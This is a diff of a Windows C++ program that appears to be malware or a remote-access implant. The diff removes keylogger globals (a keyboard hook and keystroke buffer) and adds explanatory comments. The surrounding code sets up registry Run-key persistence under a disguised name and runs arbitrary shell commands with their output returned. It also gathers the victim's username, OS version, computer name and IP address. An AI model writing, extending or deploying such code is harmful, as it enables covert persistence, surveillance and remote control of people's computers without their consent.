@@ -12,12 +12,8 @@
 #pragma comment(lib, "ntdll.lib") // Link to ntdll.lib
 #pragma comment(lib, "iphlpapi.lib")
 
-HHOOK keyboardHook;
-std::string keystrokes;
-std::atomic<bool> keepLogging(true);  // Global atomic flag to control logging
-
 typedef NTSTATUS(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
-
+// creates type aliases of existing functions that can be used in the code.
 
 
 
@@ -30,6 +26,8 @@ userInfo->UserName = username;
 This is a common implementation, but leaves extra memory on the stack
 */
 
+// Is it a privateIP address?
+
 bool IsPrivateIP(const std::string& ipAddress) {
 
 	if (ipAddress.find("10.") == 0) {
@@ -41,11 +39,13 @@ bool IsPrivateIP(const std::string& ipAddress) {
 			return true;
 		}
 	}
+
 	else if (ipAddress.find("192.168.") == 0) {
 		return true;
 	}
 	return false;
 }
+
 
 std::string GetUserIP() {
 	IP_ADAPTER_INFO adapterInfo[16];  // Assuming there are no more than 16 adapters
@@ -76,7 +76,7 @@ bool persistence() {
 	GetModuleFileNameA(NULL, exePath, MAX_PATH);
 
 	HKEY hKey;
-	const char* subKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+	const char* subKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"; // Registry key runs everytime the computer opens
 	const char* valueName = "MyApp"; // Name for the registry value
 
 	LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, subKey, 0, KEY_SET_VALUE, &hKey);
@@ -100,9 +100,7 @@ bool persistence() {
 	return false;
 }
 
-
-
-
+// Execute a command and return the output
 std::string exec(const std::string& cmd) {
 	std::string result;
 	char buffer[128];
@@ -129,14 +127,13 @@ std::string exec(const std::string& cmd) {
 	return result;
 }
 
+
+
 BOOL GetBasicUserInformation(struct BasicUserInformation& basicUserInformation) {
 	DWORD userNameBuffer = UNLEN + 1;
 	DWORD osBuffer = sizeof(OSVERSIONINFO);
 	DWORD computerNameBuffer = MAX_COMPUTERNAME_LENGTH + 1;
 	
-
-
-
 	// basicUserInformation.UserName = (LPSTR)malloc(userNameBuffer);
 	// basicUserInformation.Os = (LPSTR)malloc(osBuffer)
 
